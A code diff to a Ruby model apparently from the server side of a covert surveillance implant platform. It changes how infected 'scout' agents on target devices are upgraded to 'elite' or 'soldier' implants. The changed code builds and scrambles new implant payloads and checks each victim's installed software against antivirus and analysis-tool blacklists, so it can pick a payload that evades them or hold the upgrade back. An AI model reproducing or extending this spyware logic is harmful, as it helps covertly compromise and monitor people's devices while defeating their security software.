@@ -41,7 +41,7 @@ class Item
   field :deleted, type: Boolean, default: false
   field :uninstalled, type: Boolean
   field :demo, type: Boolean, default: false
-  field :scout, type: Boolean, default: false
+  field :level, type: Symbol, default: :scout
   field :upgradable, type: Boolean, default: false
   field :purge, type: Array, default: [0, 0]
 
@@ -52,7 +52,7 @@ class Item
   field :cs, type: String
 
   CHECKSUM_ARGUMENTS = [:_id, :name, :counter, :status, :_kind, :path]
-  AGENT_CHECKSUM_ARGUMENTS = [:instance, :type, :platform, :deleted, :uninstalled, :demo, :upgradable, :scout, :good]
+  AGENT_CHECKSUM_ARGUMENTS = [:instance, :type, :platform, :deleted, :uninstalled, :demo, :upgradable, :level, :good]
 
   # scopes
   scope :only_checksum_arguments, only(CHECKSUM_ARGUMENTS + AGENT_CHECKSUM_ARGUMENTS + [:cs])
@@ -204,6 +204,7 @@ class Item
     moved_entities = []
 
     Entity.targets.where(path: self.id).each do |entity|
+      entity.remove_from_operation_groups
       entity.update_attributes(path: new_target_path)
       RCS::DB::LinkManager.instance.del_all_links(entity)
       entity.save
@@ -212,7 +213,7 @@ class Item
 
     moved_entities.each do |entity|
       entity.handles.each { |handle| handle.link! }
-
+      entity.add_to_operation_groups
       Aggregate.target(entity.target_id).positions.each(&:add_to_intelligence_queue)
     end
   end
@@ -362,20 +363,20 @@ class Item
     self.upgrade_requests.create!({filename: name, _grid: RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'}) })
   end
 
-  def upgrade!
+  def upgrade!(params)
     raise "Cannot determine agent version" if self.version.nil?
 
     # delete any pending upgrade if requested multiple time
     self.upgrade_requests.destroy_all if self.upgradable
 
-    if self.scout
-      raise "Compromised scout cannot be upgraded" if self.version <= 3
+    if self.level.eql? :scout
+      raise "Compromised scout version cannot be upgraded" if self.version <= 6
       
       # check the presence of blacklisted AV in the device evidence
-      blacklisted_software?
+      method = blacklisted_software? params
 
       # if it's a scout, there a special procedure
-      return upgrade_scout
+      return upgrade_scout(method)
     end
 
     # in case of elite leak
@@ -429,16 +430,23 @@ class Item
     self.save
   end
 
-  def upgrade_scout
+  def upgrade_scout(method)
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
     build.load({'_id' => factory._id})
     build.unpack
     build.patch({'demo' => self.demo})
     build.scramble
-    build.melt({'bit64' => true, 'codec' => true, 'scout' => false})
 
-    add_upgrade('elite', File.join(build.tmpdir, 'output'))
+    case method
+      when :elite
+        build.melt({'bit64' => true, 'codec' => true, 'scout' => false})
+        add_upgrade('elite', File.join(build.tmpdir, 'output'))
+      when :soldier
+        build.melt({'soldier' => true, 'scout' => false})
+        soldier_name = build.soldier_name(factory.confkey)[:name]
+        add_upgrade('soldier-' + soldier_name, File.join(build.tmpdir, 'output'))
+    end
 
     build.clean
 
@@ -483,7 +491,7 @@ class Item
 
   def notify_callback
     # we are only interested if the properties changed are:
-    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled', 'scout']
+    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled', 'level']
     return if not interesting.collect {|k| changes.include? k}.inject(:|)
 
     RCS::DB::PushManager.instance.notify(self._kind, {item: self, action: 'modify'})
@@ -532,8 +540,6 @@ class Item
           Evidence.target(self.path.last).destroy_all(aid: self._id.to_s)
           trace :info, "Deleting aggregates for agent #{self.name}..."
           Aggregate.target(self.path.last).destroy_all(aid: self._id.to_s)
-          trace :info, "Rebuilding summary for target #{self.get_parent.name}..."
-          Aggregate.target(self.path.last).rebuild_summary
           trace :info, "Deleting evidence for agent #{self.name} done."
           # recalculate stats for the target
           self.get_parent.restat
@@ -557,6 +563,9 @@ class Item
     Evidence.target(self._id.to_s).collection.drop
     Aggregate.target(self._id.to_s).collection.drop
     RCS::DB::GridFS.drop_collection(self._id.to_s)
+
+    # Remove from HandleBook
+    HandleBook.remove_target(self)
   end
 
   def create_target_collections
@@ -567,8 +576,21 @@ class Item
     RCS::DB::GridFS.create_collection(self._id)
   end
 
-  def blacklisted_software?
+  def blacklist_path
+    @@blacklist_path ||= RCS::DB::Config.instance.file('blacklist')
+  end
+
+  def blacklist_analysis_path
+    @@blacklist_analysis_path ||= RCS::DB::Config.instance.file('blacklist_analysis')
+  end
+
+  def blacklisted_software?(params = {})
+    upgrade_method = :elite
+
     raise BlacklistError.new("Cannot determine blacklist") if self._kind != 'agent'
+
+    # used only by the TEST environment to force an upgrade method
+    return params['force'].to_sym if params['force']
 
     device = Evidence.target(self.path.last).where({type: 'device', aid: self._id.to_s}).last
     raise BlacklistError.new("Cannot determine installed software") unless device
@@ -576,26 +598,40 @@ class Item
     installed = device[:data]['content']
 
     # check for installed AV
-    File.open(RCS::DB::Config.instance.file('blacklist'), "r:UTF-8") do |f|
+    File.open(blacklist_path, "r:UTF-8") do |f|
       while offending = f.gets
         offending = offending.split('#').first
         offending.strip!
         offending.chomp!
         next unless offending
-        bver, bbit, bmatch = offending.split('|')
+
+        # format is:
+        # scout version | scout/offline | soldier/blacklist | architecture | AV software
+        bver, bmethod, btype, bbit, bmatch = offending.split('|')
+
+        # bmethod is $ for online or * for online/offline
+
         bver = bver.to_i
         trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i} | bit: #{bbit}"
+
         if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil &&
            (bver == 0 || self.version.to_i <= bver) &&
            (bbit == '*' || installed.match(/Architecture: /).nil? || Regexp.new("Architecture: #{bbit}", Regexp::IGNORECASE).match(installed) != nil)
           trace :warn, "Blacklisted software detected: #{bmatch} (#{bbit})"
-          raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+          case btype
+            when 'B'
+              raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+            when 'S'
+              # create the soldier instead of elite
+              upgrade_method = :soldier
+              trace :warn, "Blacklisted software: #{bmatch} (#{bbit}) can be upgraded to Soldier"
+          end
         end
       end
     end
 
     # check for installed analysis programs
-    File.readlines(RCS::DB::Config.instance.file('blacklist_analysis')).each do |offending|
+    File.readlines(blacklist_analysis_path).each do |offending|
       offending = offending.split('#').first
       offending.strip!
       offending.chomp!
@@ -606,6 +642,7 @@ class Item
       end
     end
 
+    return upgrade_method
   end
 
   def self.offload_destroy(params)
